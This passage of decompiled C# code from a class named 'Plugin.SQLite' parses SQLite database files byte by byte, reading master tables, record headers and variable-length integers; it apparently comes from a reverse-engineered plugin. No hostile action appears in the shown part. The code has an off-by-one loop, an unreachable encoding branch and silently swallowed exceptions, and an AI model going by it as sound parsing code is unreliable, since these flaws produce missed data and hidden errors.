							if (offset != 100UL)
							{
								num4 += offset;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
							this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
							int num8 = this.Gvl((int)num7);
							int num9 = num8;
							long num10 = this.Cvl((int)num7, num8);
							Plugin.SQLite.RecordHeaderField[] array = null;
							long num11 = (long)(num7 - (ulong)((long)num8) + 1UL);
							int num12 = 0;
							while (num11 < num10)
							{
								Array.Resize<Plugin.SQLite.RecordHeaderField>(ref array, num12 + 1);
								int num13 = num9 + 1;
								num9 = this.Gvl(num13);
								array[num12].Type = this.Cvl(num13, num9);
								array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num12].Type))]) : ((ulong)((!Plugin.SQLite.IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
								num11 = num11 + (long)(num9 - num13) + 1L;
								num12++;
							}
							if (array != null)
							{
								this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
								int num14 = 0;
								for (int i = 0; i <= array.Length - 1; i++)
								{
									if (array[i].Type > 9L)
									{
										if (!Plugin.SQLite.IsOdd(array[i].Type))
										{
											if (this._dbEncoding == 1UL)
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
											else if (this._dbEncoding == 2UL)
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
											else if (this._dbEncoding == 3UL)
											{
												this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
											}
										}
										else
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size);
										}
									}
									else
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)((long)num14)), (int)array[i].Size));
									}
									num14 += (int)array[i].Size;
								}
							}
						}
					}
					else if (this._fileBytes[(int)(checked((IntPtr)offset))] == 5)
					{
						uint num15 = (uint)(this.ConvertToULong((int)(offset + 3UL), 2) - 1UL);
						for (uint num16 = 0U; num16 <= num15; num16 += 1U)
						{
							uint num17 = (uint)this.ConvertToULong((int)offset + 12 + (int)(num16 * 2U), 2);
							this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num17), 4) - 1UL) * this._pageSize);
						}
						this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8UL), 4) - 1UL) * this._pageSize);
					}
					result = true;
				}
				catch
				{
					result = false;
				}
				return result;
			}

			// Token: 0x0600004F RID: 79 RVA: 0x00005624 File Offset: 0x00003824
			private void ReadMasterTable(long offset)
			{
				try
				{
					byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
					if (b != 5)
					{
						if (b == 13)
						{
							ulong num = this.ConvertToULong((int)offset + 3, 2) - 1UL;
							int num2 = 0;
							if (this._masterTableEntries != null)
							{
								num2 = this._masterTableEntries.Length;
								Array.Resize<Plugin.SQLite.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
							}
							else
							{
								this._masterTableEntries = new Plugin.SQLite.SqliteMasterEntry[num + 1UL];
							}
							for (ulong num3 = 0UL; num3 <= num; num3 += 1UL)
							{
								ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
								if (offset != 100L)
								{
									num4 += (ulong)offset;
								}
								int num5 = this.Gvl((int)num4);
								this.Cvl((int)num4, num5);
								int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL));
								this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1UL), num6);
								ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
								int num8 = this.Gvl((int)num7);
								int num9 = num8;
								long num10 = this.Cvl((int)num7, num8);
								long[] array = new long[5];
								for (int i = 0; i <= 4; i++)
								{
									int startIdx = num9 + 1;
									num9 = this.Gvl(startIdx);
									array[i] = this.Cvl(startIdx, num9);
									array[i] = (long)((array[i] <= 9L) ? ((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]) : ((ulong)((!Plugin.SQLite.IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L))));
								}
								if (this._dbEncoding == 1UL || this._dbEncoding == 2UL)
								{
									if (this._dbEncoding == 1UL)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
									else if (this._dbEncoding == 2UL)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
									else if (this._dbEncoding == 3UL)
									{
										this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0]), (int)array[1]);
									}
								}
								this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
								if (this._dbEncoding == 1UL)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
								else if (this._dbEncoding == 2UL)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
								else if (this._dbEncoding == 3UL)
								{
									this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num7 + (ulong)num10 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
								}
							}
						}
					}
					else
					{
						uint num11 = (uint)(this.ConvertToULong((int)offset + 3, 2) - 1UL);
						for (int j = 0; j <= (int)num11; j++)
						{
							uint num12 = (uint)this.ConvertToULong((int)offset + 12 + j * 2, 2);
							if (offset == 100L)
							{
								this.ReadMasterTable((long)((this.ConvertToULong((int)num12, 4) - 1UL) * this._pageSize));
							}
							else
							{
								this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num12)), 4) - 1UL) * this._pageSize));
							}
						}
						this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1UL) * this._pageSize));
					}
				}
				catch
				{
				}
			}

			// Token: 0x06000050 RID: 80 RVA: 0x00005A70 File Offset: 0x00003C70
			public bool ReadTable(string tableName)
			{
				bool result;
				try
				{
					int num = -1;
					for (int i = 0; i <= this._masterTableEntries.Length; i++)
					{
						if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
						{
							num = i;
							break;
						}
					}
					if (num == -1)
					{
						result = false;
					}
					else
					{
						string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
						{
							','
						});
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(new char[0]);
							int num2 = array[j].IndexOf(' ');
							if (num2 > 0)
							{
								array[j] = array[j].Substring(0, num2);
							}
							if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
							{
								Array.Resize<string>(ref this._fieldNames, j + 1);
								this._fieldNames[j] = array[j];
							}
						}
						result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
					}
				}
				catch
				{
					result = false;
				}
				return result;
			}

			// Token: 0x06000051 RID: 81 RVA: 0x00005BC4 File Offset: 0x00003DC4
			private ulong ConvertToULong(int startIndex, int size)
			{
				ulong result;
				try
				{
					if (size > 8 | size == 0)
					{
						result = 0UL;
					}
					else
					{
						ulong num = 0UL;
						for (int i = 0; i <= size - 1; i++)
						{
							num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
						}
						result = num;
					}
				}
				catch
				{
					result = 0UL;
				}
				return result;
			}

			// Token: 0x06000052 RID: 82 RVA: 0x00005C20 File Offset: 0x00003E20
			private int Gvl(int startIdx)
			{
				int result;
				try
				{
					if (startIdx > this._fileBytes.Length)
					{
						result = 0;
					}
					else
					{
						for (int i = startIdx; i <= startIdx + 8; i++)
						{
							if (i > this._fileBytes.Length - 1)
							{
								return 0;
							}
							if ((this._fileBytes[i] & 128) != 128)
							{
								return i;
							}
						}
						result = startIdx + 8;
					}
				}
				catch
				{
					result = 0;
				}
				return result;
			}

			// Token: 0x06000053 RID: 83 RVA: 0x00005C90 File Offset: 0x00003E90
			private long Cvl(int startIdx, int endIdx)
			{
				long result;
				try
				{
					endIdx++;
					byte[] array = new byte[8];
					int num = endIdx - startIdx;
					bool flag = false;
					if (num == 0 | num > 9)
					{
						result = 0L;
					}
					else if (num == 1)
					{
						array[0] = (this._fileBytes[startIdx] & 127);
						result = BitConverter.ToInt64(array, 0);
					}
					else
					{
						if (num == 9)
						{
							flag = true;
						}
						int num2 = 1;
						int num3 = 7;
						int num4 = 0;
						if (flag)
						{
							array[0] = this._fileBytes[endIdx - 1];
							endIdx--;
							num4 = 1;
						}
						for (int i = endIdx - 1; i >= startIdx; i += -1)
						{
							if (i - 1 >= startIdx)
							{
								array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
								num2++;
								num4++;
								num3--;
							}
							else if (!flag)
							{
								array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
							}
						}
						result = BitConverter.ToInt64(array, 0);
					}
				}
				catch
				{
					result = 0L;
				}
				return result;
			}

			// Token: 0x06000054 RID: 84 RVA: 0x000027E2 File Offset: 0x000009E2
			private static bool IsOdd(long value)
			{
				return (value & 1L) == 1L;
			}

			// Token: 0x04000084 RID: 132
			private readonly byte[] _sqlDataTypeSize = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};

			// Token: 0x04000085 RID: 133
			private readonly ulong _dbEncoding;

			// Token: 0x04000086 RID: 134
			private readonly byte[] _fileBytes;

			// Token: 0x04000087 RID: 135
			private readonly ulong _pageSize;

			// Token: 0x04000088 RID: 136
			private string[] _fieldNames;

			// Token: 0x04000089 RID: 137
			private Plugin.SQLite.SqliteMasterEntry[] _masterTableEntries;

			// Token: 0x0400008A RID: 138
			private Plugin.SQLite.TableEntry[] _tableEntries;

			// Token: 0x0200001A RID: 26
			private struct RecordHeaderField
			{
				// Token: 0x0400008B RID: 139
				public long Size;

				// Token: 0x0400008C RID: 140
				public long Type;
			}

			// Token: 0x0200001B RID: 27
			private struct TableEntry
			{
				// Token: 0x0400008D RID: 141
				public string[] Content;
			}

			// Token: 0x0200001C RID: 28
			private struct SqliteMasterEntry
			{
				// Token: 0x0400008E RID: 142
				public string ItemName;

				// Token: 0x0400008F RID: 143
				public long RootNum;

				// Token: 0x04000090 RID: 144
				public string SqlStatement;
			}
		}
	}
}
